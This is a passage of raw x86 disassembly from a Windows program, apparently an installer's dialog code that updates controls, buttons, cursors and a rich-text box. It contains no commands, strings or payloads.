  4041cf:	57                   	push   %edi
  4041d0:	a3 64 ca 42 00       	mov    %eax,0x42ca64
  4041d5:	ff d6                	call   *%esi
  4041d7:	6a ff                	push   $0xffffffff
  4041d9:	6a 1c                	push   $0x1c
  4041db:	57                   	push   %edi
  4041dc:	a3 30 aa 42 00       	mov    %eax,0x42aa30
  4041e1:	e8 4b 03 00 00       	call   0x404531
  4041e6:	ff 35 e8 36 43 00    	push   0x4336e8
  4041ec:	6a f2                	push   $0xfffffff2
  4041ee:	57                   	push   %edi
  4041ef:	ff 15 dc 81 40 00    	call   *0x4081dc
  4041f5:	6a 04                	push   $0x4
  4041f7:	e8 0f d2 ff ff       	call   0x40140b
  4041fc:	a3 cc 36 43 00       	mov    %eax,0x4336cc
  404201:	33 c0                	xor    %eax,%eax
  404203:	40                   	inc    %eax
  404204:	a3 50 ca 42 00       	mov    %eax,0x42ca50
  404209:	8b 0d 60 a3 40 00    	mov    0x40a360,%ecx
  40420f:	33 ed                	xor    %ebp,%ebp
  404211:	8b f1                	mov    %ecx,%esi
  404213:	c1 e6 06             	shl    $0x6,%esi
  404216:	03 35 20 47 43 00    	add    0x434720,%esi
  40421c:	3b cd                	cmp    %ebp,%ecx
  40421e:	7c 3e                	jl     0x40425e
  404220:	83 f8 01             	cmp    $0x1,%eax
  404223:	75 31                	jne    0x404256
  404225:	55                   	push   %ebp
  404226:	ff 76 10             	push   0x10(%esi)
  404229:	e8 5b d1 ff ff       	call   0x401389
  40422e:	85 c0                	test   %eax,%eax
  404230:	74 24                	je     0x404256
  404232:	6a 01                	push   $0x1
  404234:	55                   	push   %ebp
  404235:	68 0f 04 00 00       	push   $0x40f
  40423a:	ff 35 d8 36 43 00    	push   0x4336d8
  404240:	ff 15 58 82 40 00    	call   *0x408258
  404246:	33 c0                	xor    %eax,%eax
  404248:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  40424e:	0f 94 c0             	sete   %al
  404251:	e9 aa 02 00 00       	jmp    0x404500
  404256:	39 2e                	cmp    %ebp,(%esi)
  404258:	0f 84 a0 02 00 00    	je     0x4044fe
  40425e:	68 0b 04 00 00       	push   $0x40b
  404263:	e8 15 03 00 00       	call   0x40457d
  404268:	a1 50 ca 42 00       	mov    0x42ca50,%eax
  40426d:	01 05 60 a3 40 00    	add    %eax,0x40a360
  404273:	c1 e0 06             	shl    $0x6,%eax
  404276:	03 f0                	add    %eax,%esi
  404278:	a1 60 a3 40 00       	mov    0x40a360,%eax
  40427d:	3b 05 24 47 43 00    	cmp    0x434724,%eax
  404283:	75 07                	jne    0x40428c
  404285:	6a 01                	push   $0x1
  404287:	e8 7f d1 ff ff       	call   0x40140b
  40428c:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  404292:	0f 85 24 02 00 00    	jne    0x4044bc
  404298:	a1 24 47 43 00       	mov    0x434724,%eax
  40429d:	39 05 60 a3 40 00    	cmp    %eax,0x40a360
  4042a3:	0f 83 13 02 00 00    	jae    0x4044bc
  4042a9:	ff 76 24             	push   0x24(%esi)
  4042ac:	8b 5e 14             	mov    0x14(%esi),%ebx
  4042af:	68 00 40 44 00       	push   $0x444000
  4042b4:	e8 36 23 00 00       	call   0x4065ef
  4042b9:	ff 76 20             	push   0x20(%esi)
  4042bc:	68 19 fc ff ff       	push   $0xfffffc19
  4042c1:	57                   	push   %edi
  4042c2:	e8 6a 02 00 00       	call   0x404531
  4042c7:	ff 76 1c             	push   0x1c(%esi)
  4042ca:	68 1b fc ff ff       	push   $0xfffffc1b
  4042cf:	57                   	push   %edi
  4042d0:	e8 5c 02 00 00       	call   0x404531
  4042d5:	ff 76 28             	push   0x28(%esi)
  4042d8:	68 1a fc ff ff       	push   $0xfffffc1a
  4042dd:	57                   	push   %edi
  4042de:	e8 4e 02 00 00       	call   0x404531
  4042e3:	6a 03                	push   $0x3
  4042e5:	57                   	push   %edi
  4042e6:	ff 15 3c 82 40 00    	call   *0x40823c
  4042ec:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  4042f2:	89 44 24 30          	mov    %eax,0x30(%esp)
  4042f6:	74 08                	je     0x404300
  4042f8:	66 81 e3 fd fe       	and    $0xfefd,%bx
  4042fd:	83 cb 04             	or     $0x4,%ebx
  404300:	8b cb                	mov    %ebx,%ecx
  404302:	83 e1 08             	and    $0x8,%ecx
  404305:	51                   	push   %ecx
  404306:	50                   	push   %eax
  404307:	ff 15 28 82 40 00    	call   *0x408228
  40430d:	8b c3                	mov    %ebx,%eax
  40430f:	25 00 01 00 00       	and    $0x100,%eax
  404314:	50                   	push   %eax
  404315:	ff 74 24 34          	push   0x34(%esp)
  404319:	ff 15 50 82 40 00    	call   *0x408250
  40431f:	8b c3                	mov    %ebx,%eax
  404321:	83 e0 02             	and    $0x2,%eax
  404324:	50                   	push   %eax
  404325:	e8 29 02 00 00       	call   0x404553
  40432a:	83 e3 04             	and    $0x4,%ebx
  40432d:	53                   	push   %ebx
  40432e:	ff 35 30 aa 42 00    	push   0x42aa30
  404334:	ff 15 50 82 40 00    	call   *0x408250
  40433a:	3b dd                	cmp    %ebp,%ebx
  40433c:	74 03                	je     0x404341
  40433e:	55                   	push   %ebp
  40433f:	eb 02                	jmp    0x404343
  404341:	6a 01                	push   $0x1
  404343:	68 60 f0 00 00       	push   $0xf060
  404348:	55                   	push   %ebp
  404349:	57                   	push   %edi
  40434a:	ff 15 e0 81 40 00    	call   *0x4081e0
  404350:	50                   	push   %eax
  404351:	ff 15 e4 81 40 00    	call   *0x4081e4
  404357:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  40435d:	6a 01                	push   $0x1
  40435f:	55                   	push   %ebp
  404360:	68 f4 00 00 00       	push   $0xf4
  404365:	ff 74 24 3c          	push   0x3c(%esp)
  404369:	ff d3                	call   *%ebx
  40436b:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  404371:	74 13                	je     0x404386
  404373:	55                   	push   %ebp
  404374:	6a 02                	push   $0x2
  404376:	68 01 04 00 00       	push   $0x401
  40437b:	57                   	push   %edi
  40437c:	ff d3                	call   *%ebx
  40437e:	ff 35 30 aa 42 00    	push   0x42aa30
  404384:	eb 06                	jmp    0x40438c
  404386:	ff 35 64 ca 42 00    	push   0x42ca64
  40438c:	e8 d5 01 00 00       	call   0x404566
  404391:	e8 7d fc ff ff       	call   0x404013
  404396:	bb 68 ca 42 00       	mov    $0x42ca68,%ebx
  40439b:	50                   	push   %eax
  40439c:	53                   	push   %ebx
  40439d:	e8 10 22 00 00       	call   0x4065b2
  4043a2:	ff 76 18             	push   0x18(%esi)
  4043a5:	53                   	push   %ebx
  4043a6:	e8 1d 22 00 00       	call   0x4065c8
  4043ab:	8d 04 45 68 ca 42 00 	lea    0x42ca68(,%eax,2),%eax
  4043b2:	50                   	push   %eax
  4043b3:	e8 37 22 00 00       	call   0x4065ef
  4043b8:	53                   	push   %ebx
  4043b9:	57                   	push   %edi
  4043ba:	ff 15 1c 82 40 00    	call   *0x40821c
  4043c0:	55                   	push   %ebp
  4043c1:	ff 76 08             	push   0x8(%esi)
  4043c4:	e8 c0 cf ff ff       	call   0x401389
  4043c9:	85 c0                	test   %eax,%eax
  4043cb:	0f 85 97 fe ff ff    	jne    0x404268
  4043d1:	39 2e                	cmp    %ebp,(%esi)
  4043d3:	0f 84 8f fe ff ff    	je     0x404268
  4043d9:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4043dd:	75 1d                	jne    0x4043fc
  4043df:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  4043e5:	0f 85 13 01 00 00    	jne    0x4044fe
  4043eb:	39 2d 80 47 43 00    	cmp    %ebp,0x434780
  4043f1:	0f 85 71 fe ff ff    	jne    0x404268
  4043f7:	e9 02 01 00 00       	jmp    0x4044fe
  4043fc:	ff 35 d8 36 43 00    	push   0x4336d8
  404402:	ff 15 10 82 40 00    	call   *0x408210
  404408:	89 35 40 ba 42 00    	mov    %esi,0x42ba40
  40440e:	39 2e                	cmp    %ebp,(%esi)
  404410:	0f 8e c5 00 00 00    	jle    0x4044db
  404416:	8b 46 04             	mov    0x4(%esi),%eax
  404419:	56                   	push   %esi
  40441a:	ff 34 85 64 a3 40 00 	push   0x40a364(,%eax,4)
  404421:	66 8b 06             	mov    (%esi),%ax
  404424:	66 03 05 e0 36 43 00 	add    0x4336e0,%ax
  40442b:	57                   	push   %edi
  40442c:	0f b7 c0             	movzwl %ax,%eax
  40442f:	50                   	push   %eax
  404430:	ff 35 00 47 43 00    	push   0x434700
  404436:	ff 15 14 82 40 00    	call   *0x408214
  40443c:	3b c5                	cmp    %ebp,%eax
  40443e:	a3 d8 36 43 00       	mov    %eax,0x4336d8
  404443:	0f 84 92 00 00 00    	je     0x4044db
  404449:	ff 76 2c             	push   0x2c(%esi)
  40444c:	6a 06                	push   $0x6
  40444e:	50                   	push   %eax
  40444f:	e8 dd 00 00 00       	call   0x404531
  404454:	8d 44 24 10          	lea    0x10(%esp),%eax
  404458:	50                   	push   %eax
  404459:	68 fa 03 00 00       	push   $0x3fa
  40445e:	57                   	push   %edi
  40445f:	ff 15 3c 82 40 00    	call   *0x40823c
  404465:	50                   	push   %eax
  404466:	ff 15 e8 81 40 00    	call   *0x4081e8
  40446c:	8d 44 24 10          	lea    0x10(%esp),%eax
  404470:	50                   	push   %eax
  404471:	57                   	push   %edi
  404472:	ff 15 ec 81 40 00    	call   *0x4081ec
  404478:	6a 15                	push   $0x15
  40447a:	55                   	push   %ebp
  40447b:	55                   	push   %ebp
  40447c:	ff 74 24 20          	push   0x20(%esp)
  404480:	ff 74 24 20          	push   0x20(%esp)
  404484:	55                   	push   %ebp
  404485:	ff 35 d8 36 43 00    	push   0x4336d8
  40448b:	ff 15 d0 81 40 00    	call   *0x4081d0
  404491:	55                   	push   %ebp
  404492:	ff 76 0c             	push   0xc(%esi)
  404495:	e8 ef ce ff ff       	call   0x401389
  40449a:	39 2d cc 36 43 00    	cmp    %ebp,0x4336cc
  4044a0:	75 5c                	jne    0x4044fe
  4044a2:	6a 08                	push   $0x8
  4044a4:	ff 35 d8 36 43 00    	push   0x4336d8
  4044aa:	ff 15 28 82 40 00    	call   *0x408228
  4044b0:	68 05 04 00 00       	push   $0x405
  4044b5:	e8 c3 00 00 00       	call   0x40457d
  4044ba:	eb 1f                	jmp    0x4044db
  4044bc:	ff 35 d8 36 43 00    	push   0x4336d8
  4044c2:	ff 15 10 82 40 00    	call   *0x408210
  4044c8:	ff 35 38 b2 42 00    	push   0x42b238
  4044ce:	89 2d 08 47 43 00    	mov    %ebp,0x434708
  4044d4:	57                   	push   %edi
  4044d5:	ff 15 f0 81 40 00    	call   *0x4081f0
  4044db:	39 2d 68 ea 42 00    	cmp    %ebp,0x42ea68
  4044e1:	75 1b                	jne    0x4044fe
  4044e3:	39 2d d8 36 43 00    	cmp    %ebp,0x4336d8
  4044e9:	74 13                	je     0x4044fe
  4044eb:	6a 0a                	push   $0xa
  4044ed:	57                   	push   %edi
  4044ee:	ff 15 28 82 40 00    	call   *0x408228
  4044f4:	c7 05 68 ea 42 00 01 	movl   $0x1,0x42ea68
  4044fb:	00 00 00 
  4044fe:	33 c0                	xor    %eax,%eax
  404500:	5f                   	pop    %edi
  404501:	5e                   	pop    %esi
  404502:	5d                   	pop    %ebp
  404503:	5b                   	pop    %ebx
  404504:	83 c4 10             	add    $0x10,%esp
  404507:	c2 10 00             	ret    $0x10
  40450a:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  40450f:	75 06                	jne    0x404517
  404511:	ff 05 cc 36 43 00    	incl   0x4336cc
  404517:	6a 00                	push   $0x0
  404519:	ff 74 24 08          	push   0x8(%esp)
  40451d:	68 08 04 00 00       	push   $0x408
  404522:	ff 35 08 47 43 00    	push   0x434708
  404528:	ff 15 58 82 40 00    	call   *0x408258
  40452e:	c2 04 00             	ret    $0x4
  404531:	ff 74 24 0c          	push   0xc(%esp)
  404535:	6a 00                	push   $0x0
  404537:	e8 b3 20 00 00       	call   0x4065ef
  40453c:	50                   	push   %eax
  40453d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404541:	05 e8 03 00 00       	add    $0x3e8,%eax
  404546:	50                   	push   %eax
  404547:	ff 74 24 0c          	push   0xc(%esp)
  40454b:	e8 a0 16 00 00       	call   0x405bf0
  404550:	c2 0c 00             	ret    $0xc
  404553:	ff 74 24 04          	push   0x4(%esp)
  404557:	ff 35 64 ca 42 00    	push   0x42ca64
  40455d:	ff 15 50 82 40 00    	call   *0x408250
  404563:	c2 04 00             	ret    $0x4
  404566:	6a 01                	push   $0x1
  404568:	ff 74 24 08          	push   0x8(%esp)
  40456c:	6a 28                	push   $0x28
  40456e:	ff 35 08 47 43 00    	push   0x434708
  404574:	ff 15 58 82 40 00    	call   *0x408258
  40457a:	c2 04 00             	ret    $0x4
  40457d:	a1 d8 36 43 00       	mov    0x4336d8,%eax
  404582:	85 c0                	test   %eax,%eax
  404584:	74 0f                	je     0x404595
  404586:	6a 00                	push   $0x0
  404588:	6a 00                	push   $0x0
  40458a:	ff 74 24 0c          	push   0xc(%esp)
  40458e:	50                   	push   %eax
  40458f:	ff 15 58 82 40 00    	call   *0x408258
  404595:	c2 04 00             	ret    $0x4
  404598:	55                   	push   %ebp
  404599:	8b ec                	mov    %esp,%ebp
  40459b:	83 ec 0c             	sub    $0xc,%esp
  40459e:	8b 45 08             	mov    0x8(%ebp),%eax
  4045a1:	56                   	push   %esi
  4045a2:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  4045a7:	83 f8 05             	cmp    $0x5,%eax
  4045aa:	0f 87 b0 00 00 00    	ja     0x404660
  4045b0:	6a eb                	push   $0xffffffeb
  4045b2:	ff 75 10             	push   0x10(%ebp)
  4045b5:	ff 15 d4 81 40 00    	call   *0x4081d4
  4045bb:	8b f0                	mov    %eax,%esi
  4045bd:	85 f6                	test   %esi,%esi
  4045bf:	0f 84 9b 00 00 00    	je     0x404660
  4045c5:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4045c9:	0f 87 91 00 00 00    	ja     0x404660
  4045cf:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4045d3:	0f 87 87 00 00 00    	ja     0x404660
  4045d9:	8b 4e 14             	mov    0x14(%esi),%ecx
  4045dc:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4045e2:	75 7c                	jne    0x404660
  4045e4:	8b 06                	mov    (%esi),%eax
  4045e6:	57                   	push   %edi
  4045e7:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  4045ed:	f6 c1 02             	test   $0x2,%cl
  4045f0:	74 03                	je     0x4045f5
  4045f2:	50                   	push   %eax
  4045f3:	ff d7                	call   *%edi
  4045f5:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4045f9:	74 0a                	je     0x404605
  4045fb:	50                   	push   %eax
  4045fc:	ff 75 0c             	push   0xc(%ebp)
  4045ff:	ff 15 64 80 40 00    	call   *0x408064
  404605:	ff 76 10             	push   0x10(%esi)
  404608:	ff 75 0c             	push   0xc(%ebp)
  40460b:	ff 15 60 80 40 00    	call   *0x408060
  404611:	8b 46 04             	mov    0x4(%esi),%eax
  404614:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404618:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40461b:	74 06                	je     0x404623
  40461d:	50                   	push   %eax
  40461e:	ff d7                	call   *%edi
  404620:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404623:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  404627:	5f                   	pop    %edi
  404628:	74 0a                	je     0x404634
  40462a:	50                   	push   %eax
  40462b:	ff 75 0c             	push   0xc(%ebp)
  40462e:	ff 15 4c 80 40 00    	call   *0x40804c
  404634:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404638:	74 21                	je     0x40465b
  40463a:	8b 46 08             	mov    0x8(%esi),%eax
  40463d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404640:	8b 46 0c             	mov    0xc(%esi),%eax
  404643:	85 c0                	test   %eax,%eax
  404645:	74 07                	je     0x40464e
  404647:	50                   	push   %eax
  404648:	ff 15 54 80 40 00    	call   *0x408054
  40464e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404651:	50                   	push   %eax
  404652:	ff 15 58 80 40 00    	call   *0x408058
  404658:	89 46 0c             	mov    %eax,0xc(%esi)
  40465b:	8b 46 0c             	mov    0xc(%esi),%eax
  40465e:	eb 02                	jmp    0x404662
  404660:	33 c0                	xor    %eax,%eax
  404662:	5e                   	pop    %esi
  404663:	c9                   	leave
  404664:	c2 0c 00             	ret    $0xc
  404667:	55                   	push   %ebp
  404668:	8b ec                	mov    %esp,%ebp
  40466a:	8b 45 10             	mov    0x10(%ebp),%eax
  40466d:	8b 0d 34 aa 42 00    	mov    0x42aa34,%ecx
  404673:	d1 e8                	shr    $1,%eax
  404675:	50                   	push   %eax
  404676:	8b 45 08             	mov    0x8(%ebp),%eax
  404679:	03 c8                	add    %eax,%ecx
  40467b:	51                   	push   %ecx
  40467c:	ff 75 0c             	push   0xc(%ebp)
  40467f:	ff 15 98 80 40 00    	call   *0x408098
  404685:	ff 75 0c             	push   0xc(%ebp)
  404688:	ff 15 9c 80 40 00    	call   *0x40809c
  40468e:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404691:	03 c0                	add    %eax,%eax
  404693:	89 01                	mov    %eax,(%ecx)
  404695:	01 05 34 aa 42 00    	add    %eax,0x42aa34
  40469b:	33 c0                	xor    %eax,%eax
  40469d:	5d                   	pop    %ebp
  40469e:	c2 10 00             	ret    $0x10
  4046a1:	55                   	push   %ebp
  4046a2:	8b ec                	mov    %esp,%ebp
  4046a4:	a1 34 aa 42 00       	mov    0x42aa34,%eax
  4046a9:	56                   	push   %esi
  4046aa:	8b 75 08             	mov    0x8(%ebp),%esi
  4046ad:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4046b0:	50                   	push   %eax
  4046b1:	ff 15 9c 80 40 00    	call   *0x40809c
  4046b7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4046ba:	d1 e9                	shr    $1,%ecx
  4046bc:	3b c1                	cmp    %ecx,%eax
  4046be:	72 02                	jb     0x4046c2
  4046c0:	8b c1                	mov    %ecx,%eax
  4046c2:	33 c9                	xor    %ecx,%ecx
  4046c4:	51                   	push   %ecx
  4046c5:	51                   	push   %ecx
  4046c6:	ff 75 10             	push   0x10(%ebp)
  4046c9:	ff 75 0c             	push   0xc(%ebp)
  4046cc:	50                   	push   %eax
  4046cd:	a1 34 aa 42 00       	mov    0x42aa34,%eax
  4046d2:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4046d5:	50                   	push   %eax
  4046d6:	51                   	push   %ecx
  4046d7:	51                   	push   %ecx
  4046d8:	ff 15 94 80 40 00    	call   *0x408094
  4046de:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4046e1:	5e                   	pop    %esi
  4046e2:	89 01                	mov    %eax,(%ecx)
  4046e4:	01 05 34 aa 42 00    	add    %eax,0x42aa34
  4046ea:	33 c0                	xor    %eax,%eax
  4046ec:	5d                   	pop    %ebp
  4046ed:	c2 10 00             	ret    $0x10
  4046f0:	55                   	push   %ebp
  4046f1:	8b ec                	mov    %esp,%ebp
  4046f3:	83 ec 0c             	sub    $0xc,%esp
  4046f6:	53                   	push   %ebx
  4046f7:	33 db                	xor    %ebx,%ebx
  4046f9:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404700:	56                   	push   %esi
  404701:	57                   	push   %edi
  404702:	0f 85 1a 01 00 00    	jne    0x404822
  404708:	8b 7d 14             	mov    0x14(%ebp),%edi
  40470b:	8b 47 30             	mov    0x30(%edi),%eax
  40470e:	3b c3                	cmp    %ebx,%eax
  404710:	7d 11                	jge    0x404723
  404712:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  404718:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40471f:	2b c8                	sub    %eax,%ecx
  404721:	8b 01                	mov    (%ecx),%eax
  404723:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  404729:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  40472c:	0f b7 08             	movzwl (%eax),%ecx
  40472f:	40                   	inc    %eax
  404730:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404733:	40                   	inc    %eax
  404734:	83 f9 02             	cmp    $0x2,%ecx
  404737:	89 45 14             	mov    %eax,0x14(%ebp)
  40473a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40473d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404740:	c7 45 fc a1 46 40 00 	movl   $0x4046a1,-0x4(%ebp)
  404747:	74 07                	je     0x404750
  404749:	c7 45 fc 67 46 40 00 	movl   $0x404667,-0x4(%ebp)
  404750:	8b 47 14             	mov    0x14(%edi),%eax
  404753:	ff 77 34             	push   0x34(%edi)
  404756:	8b f0                	mov    %eax,%esi
  404758:	83 e0 01             	and    $0x1,%eax
  40475b:	f7 d6                	not    %esi
  40475d:	c1 ee 05             	shr    $0x5,%esi
  404760:	6a 22                	push   $0x22
  404762:	83 e6 01             	and    $0x1,%esi
  404765:	ff 75 08             	push   0x8(%ebp)
  404768:	0b f0                	or     %eax,%esi
  40476a:	e8 c2 fd ff ff       	call   0x404531
  40476f:	ff 77 38             	push   0x38(%edi)
  404772:	6a 23                	push   $0x23
  404774:	ff 75 08             	push   0x8(%ebp)
  404777:	e8 b5 fd ff ff       	call   0x404531
  40477c:	33 c0                	xor    %eax,%eax
  40477e:	3b f3                	cmp    %ebx,%esi
  404780:	0f 94 c0             	sete   %al
  404783:	05 0a 04 00 00       	add    $0x40a,%eax
  404788:	6a 01                	push   $0x1
  40478a:	50                   	push   %eax
  40478b:	ff 75 08             	push   0x8(%ebp)
  40478e:	ff 15 c0 81 40 00    	call   *0x4081c0
  404794:	56                   	push   %esi
  404795:	e8 b9 fd ff ff       	call   0x404553
  40479a:	68 e8 03 00 00       	push   $0x3e8
  40479f:	ff 75 08             	push   0x8(%ebp)
  4047a2:	ff 15 3c 82 40 00    	call   *0x40823c
  4047a8:	8b f8                	mov    %eax,%edi
  4047aa:	57                   	push   %edi
  4047ab:	e8 b6 fd ff ff       	call   0x404566
  4047b0:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4047b6:	53                   	push   %ebx
  4047b7:	6a 01                	push   $0x1
  4047b9:	68 5b 04 00 00       	push   $0x45b
  4047be:	57                   	push   %edi
  4047bf:	ff d6                	call   *%esi
  4047c1:	a1 10 47 43 00       	mov    0x434710,%eax
  4047c6:	8b 40 68             	mov    0x68(%eax),%eax
  4047c9:	3b c3                	cmp    %ebx,%eax
  4047cb:	7d 09                	jge    0x4047d6
  4047cd:	f7 d8                	neg    %eax
  4047cf:	50                   	push   %eax
  4047d0:	ff 15 cc 81 40 00    	call   *0x4081cc
  4047d6:	50                   	push   %eax
  4047d7:	53                   	push   %ebx
  4047d8:	68 43 04 00 00       	push   $0x443
  4047dd:	57                   	push   %edi
  4047de:	ff d6                	call   *%esi
  4047e0:	68 00 00 01 04       	push   $0x4010000
  4047e5:	53                   	push   %ebx
  4047e6:	68 45 04 00 00       	push   $0x445
  4047eb:	57                   	push   %edi
  4047ec:	ff d6                	call   *%esi
  4047ee:	ff 75 14             	push   0x14(%ebp)
  4047f1:	e8 d2 1d 00 00       	call   0x4065c8
  4047f6:	50                   	push   %eax
  4047f7:	53                   	push   %ebx
  4047f8:	68 35 04 00 00       	push   $0x435
  4047fd:	57                   	push   %edi
  4047fe:	ff d6                	call   *%esi
  404800:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404803:	89 1d 34 aa 42 00    	mov    %ebx,0x42aa34
  404809:	50                   	push   %eax
  40480a:	ff 75 0c             	push   0xc(%ebp)
  40480d:	68 49 04 00 00       	push   $0x449
  404812:	57                   	push   %edi
  404813:	ff d6                	call   *%esi
  404815:	89 1d 34 aa 42 00    	mov    %ebx,0x42aa34
  40481b:	33 c0                	xor    %eax,%eax
  40481d:	e9 52 01 00 00       	jmp    0x404974
  404822:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404829:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40482f:	75 5b                	jne    0x40488c
  404831:	8b 45 10             	mov    0x10(%ebp),%eax
  404834:	c1 e8 10             	shr    $0x10,%eax
  404837:	66 85 c0             	test   %ax,%ax
  40483a:	0f 85 25 01 00 00    	jne    0x404965
  404840:	39 1d 34 aa 42 00    	cmp    %ebx,0x42aa34
  404846:	0f 85 19 01 00 00    	jne    0x404965
  40484c:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  404851:	8d 78 14             	lea    0x14(%eax),%edi
  404854:	f6 07 20             	testb  $0x20,(%edi)
  404857:	0f 84 08 01 00 00    	je     0x404965
  40485d:	53                   	push   %ebx
  40485e:	53                   	push   %ebx
  40485f:	68 f0 00 00 00       	push   $0xf0
  404864:	68 0a 04 00 00       	push   $0x40a
  404869:	ff 75 08             	push   0x8(%ebp)
  40486c:	ff 15 3c 82 40 00    	call   *0x40823c
  404872:	50                   	push   %eax
  404873:	ff d6                	call   *%esi
  404875:	8b 0f                	mov    (%edi),%ecx
  404877:	83 e0 01             	and    $0x1,%eax
  40487a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40487d:	50                   	push   %eax
  40487e:	0b c8                	or     %eax,%ecx
  404880:	89 0f                	mov    %ecx,(%edi)
  404882:	e8 cc fc ff ff       	call   0x404553
  404887:	e8 ef 00 00 00       	call   0x40497b
  40488c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404890:	0f 85 c0 00 00 00    	jne    0x404956
  404896:	68 e8 03 00 00       	push   $0x3e8
  40489b:	ff 75 08             	push   0x8(%ebp)
  40489e:	ff 15 3c 82 40 00    	call   *0x40823c
  4048a4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4048a7:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4048ae:	75 67                	jne    0x404917
  4048b0:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4048b7:	75 5e                	jne    0x404917
  4048b9:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4048bc:	8b 57 18             	mov    0x18(%edi),%edx
  4048bf:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4048c2:	2b ca                	sub    %edx,%ecx
  4048c4:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4048ca:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4048cd:	c7 45 fc a0 26 43 00 	movl   $0x4326a0,-0x4(%ebp)
  4048d4:	73 41                	jae    0x404917
  4048d6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4048d9:	51                   	push   %ecx
  4048da:	53                   	push   %ebx
  4048db:	68 4b 04 00 00       	push   $0x44b
  4048e0:	50                   	push   %eax
  4048e1:	ff d6                	call   *%esi
  4048e3:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4048e9:	68 02 7f 00 00       	push   $0x7f02
  4048ee:	53                   	push   %ebx
  4048ef:	ff d7                	call   *%edi
  4048f1:	50                   	push   %eax
  4048f2:	ff 15 c8 81 40 00    	call   *0x4081c8
  4048f8:	6a 01                	push   $0x1
  4048fa:	ff 75 fc             	push   -0x4(%ebp)
  4048fd:	ff 75 08             	push   0x8(%ebp)
  404900:	e8 9a 00 00 00       	call   0x40499f
  404905:	68 00 7f 00 00       	push   $0x7f00
  40490a:	53                   	push   %ebx
  40490b:	ff d7                	call   *%edi
  40490d:	50                   	push   %eax
  40490e:	ff 15 c8 81 40 00    	call   *0x4081c8
  404914:	8b 7d 14             	mov    0x14(%ebp),%edi
  404917:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  40491e:	75 48                	jne    0x404968
  404920:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404927:	75 3f                	jne    0x404968
  404929:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  40492d:	75 10                	jne    0x40493f
  40492f:	53                   	push   %ebx
  404930:	6a 01                	push   $0x1
  404932:	68 11 01 00 00       	push   $0x111
  404937:	ff 35 08 47 43 00    	push   0x434708
  40493d:	ff d6                	call   *%esi
  40493f:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404943:	75 0c                	jne    0x404951
  404945:	53                   	push   %ebx
  404946:	53                   	push   %ebx
  404947:	6a 10                	push   $0x10
  404949:	ff 35 08 47 43 00    	push   0x434708
  40494f:	ff d6                	call   *%esi
  404951:	33 c0                	xor    %eax,%eax
  404953:	40                   	inc    %eax
  404954:	eb 1e                	jmp    0x404974
  404956:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40495d:	75 06                	jne    0x404965
  40495f:	ff 05 34 aa 42 00    	incl   0x42aa34
  404965:	8b 7d 14             	mov    0x14(%ebp),%edi
  404968:	57                   	push   %edi
  404969:	ff 75 10             	push   0x10(%ebp)
  40496c:	ff 75 0c             	push   0xc(%ebp)
  40496f:	e8 24 fc ff ff       	call   0x404598
  404974:	5f                   	pop    %edi
  404975:	5e                   	pop    %esi
  404976:	5b                   	pop    %ebx
  404977:	c9                   	leave
  404978:	c2 10 00             	ret    $0x10
  40497b:	83 3d 8c 47 43 00 00 	cmpl   $0x0,0x43478c
  404982:	a1 30 aa 42 00       	mov    0x42aa30,%eax
  404987:	75 05                	jne    0x40498e
  404989:	a1 64 ca 42 00       	mov    0x42ca64,%eax
  40498e:	6a 01                	push   $0x1
  404990:	6a 01                	push   $0x1
  404992:	68 f4 00 00 00       	push   $0xf4
  404997:	50                   	push   %eax
